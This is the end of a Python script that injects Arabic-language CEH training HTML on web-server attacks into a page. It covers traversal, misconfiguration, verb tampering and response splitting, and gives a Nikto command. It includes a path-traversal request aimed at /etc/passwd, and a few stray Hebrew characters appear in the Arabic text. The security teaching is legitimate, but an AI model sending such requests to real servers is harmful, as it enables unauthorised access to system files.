              <span class="badge badge-tool">🔧 Nikto · DirBuster · Uniscan</span>
            </div>
          </div>
        </div>

        <div class="info-duo">
          <div class="info-box what">
            <h5>📖 Web Servers vs Web Apps</h5>
            <p>يجب التمييز: اختراق تطبيقات الويب (Web Apps) يركز على الكود الذي كتبه المبرمج (XSS, SQLi). أما اختراق <strong>خوادم الويب (Web Servers)</strong> يركز على البرنامج الذي يستضيف الموقع نفسه (Apache, Nginx, Microsoft IIS) وإعداداته والثغرات في الـ Modules الخاصة به.</p>
          </div>
          <div class="info-box goal">
            <h5>🎯 منهجية الاستهداف</h5>
            <p>تبدأ בجمع المعلومات (Information Gathering)، فحص المنافذ والخدمات، قراءة الـ Banners (التي تفضح إصدار السيرفر)، فحص الثغرات باستخدام أدوات زي Nikto، ثم الاستغلال للوصول للملفات أو تنفيذ الأوامر.</p>
          </div>
        </div>

        <div class="cyber-card">
          <div class="card-header"><h3>أبرز الهجمات على خوادم الويب</h3></div>
          
          <h4>1. Directory Traversal (Path Traversal)</h4>
          <p>تحدث عندما لا يفرض خادم الويب قيوداً صارمة على المجلد الجذري (Web Root). يمكن للمهاجم استخدام رموز الصعود <code>../</code> للخروج من مجلد الموقع والوصول لملفات النظام الحساسة.</p>
          <div class="cmd-block">
            <div class="cmd-header"><span class="cmd-lang">مثال لطلب خبيث</span></div>
            <pre><code>GET /images/../../../etc/passwd HTTP/1.1</code></pre>
          </div>

          <h4>2. Web Server Misconfiguration (أخطاء الإعداد)</h4>
          <p>أكثر الثغرات شيوعاً في الخوادم! تحدث بسبب كسل مدير النظام أو ترك الإعدادات الافتراضية:</p>
          <ul>
            <li><strong>Directory Listing:</strong> السماح بعرض محتويات المجلد إذا غاب ملف `index.html`. المهاجم قد يرى مجلدات الـ Backups، الأكواد، أو ملفات الـ Config.</li>
            <li><strong>Default Pages:</strong> ترك صفحات الديفولت (مثل صفحة Apache Tomcat الافتراضية) التي تحتوي على رابط للـ Manager App وكلمات المرور الافتراضية.</li>
            <li><strong>Verbose Error Messages:</strong> عرض رسائل خطأ تفصيلية تكشف إصدار قاعدة البيانات والمسارات الحقيقية في السيرفر.</li>
          </ul>

          <h4>3. HTTP Verb Tampering</h4>
          <p>بروتوكول HTTP يحتوي على دوال متعددة (GET, POST, OPTIONS, PUT, DELETE, TRACE). خوادم الويب القديمة أو سيئة الإعداد قد تترك دوال خطيرة مفعلة. 
          على سبيل المثال، تفعيل الدالة <code>PUT</code> يسمح للمهاجم برفع ملفات مباشرة للسيرفر (كأنه يرفع Web Shell). وتفعيل <code>TRACE</code> يتيح هجوم <code>Cross-Site Tracing (XST)</code> لسرقة الكوكيز متجاوزاً HttpOnly.</p>

          <h4>4. HTTP Response Splitting</h4>
          <p>هجوم يعتمد على إدخال أحرف نهاية السطر <code>CRLF (%0d%0a)</code> في مدخلات المستخدم التي يعكسها الخادم في الترويسة (Header). يتيح للمهاجم شطر استجابة הـ HTTP إلى استجابتين، مما يمكنه من تسميم الكاش (Cache Poisoning) أو تنفيذ XSS من نوع خاص.</p>
        </div>

        <div class="cyber-card">
          <div class="card-header"><h3>أدوات فحص خوادم الويب الأساسية</h3></div>
          <table class="tools-table">
            <thead>
              <tr><th>الأداة</th><th>الغرض والوظيفة الأساسية</th></tr>
            </thead>
            <tbody>
              <tr>
                <td><strong>Nikto</strong></td>
                <td>أقوى وأشهر فاحص كلاسيكي لخوادم الويب. يبحث عن +6700 ملف خطير، يكتشف البرمجيات القديمة، ويحلل الـ Headers واخطاء הـ Misconfiguration.<br><code>nikto -h http://target.com</code></td>
              </tr>
              <tr>
                <td><strong>DirBuster / Gobuster</strong></td>
                <td>أدوات لعمل Brute-force لاكتشاف المجلدات والملفات المخفية في خادم الويب باستخدام قوائم كلمات (Wordlists).</td>
              </tr>
              <tr>
                <td><strong>httprecon / WhatWeb</strong></td>
                <td>التعرف الدقيق والبصمة (Fingerprinting) لمعرفة نوع الـ Web Server والإصدار.</td>
              </tr>
            </tbody>
          </table>
        </div>
      </div>

"""

# Substitute the existing CEH content blocks
ceh_pattern = re.compile(r'<!-- CEH Module 8: Sniffing -->.*?(?=      <!-- Category)', re.DOTALL)
# Wait, the content is inserted just before the closing tags of meth-viewer.
# There is no <!-- Category after it. 
# Let's match from <!-- CEH Module 8: Sniffing --> to the end of the file, then re-add the closing tags.
ceh_block_pattern = re.compile(r'<!-- CEH Module 8: Sniffing -->.*</div>\s*</div>\s*</div>\s*', re.DOTALL)

# Let's use a safer regex: replace everything from <!-- CEH Module 8: Sniffing --> to the last </div>
# Actually, I can just replace everything from <!-- CEH Module 8: Sniffing --> to the end of the last meth-content-view div.
ceh_block_pattern2 = re.compile(r'<!-- CEH Module 8: Sniffing -->.*<!-- CEH Module 13.*?</div>\s*</div>\s*</div>', re.DOTALL)

content = ceh_block_pattern2.sub(ceh_content_deep, content)

with open(html_path, "w", encoding="utf-8") as f:
    f.write(content)

print("CEH modules rewritten successfully with deep comprehensive content.")
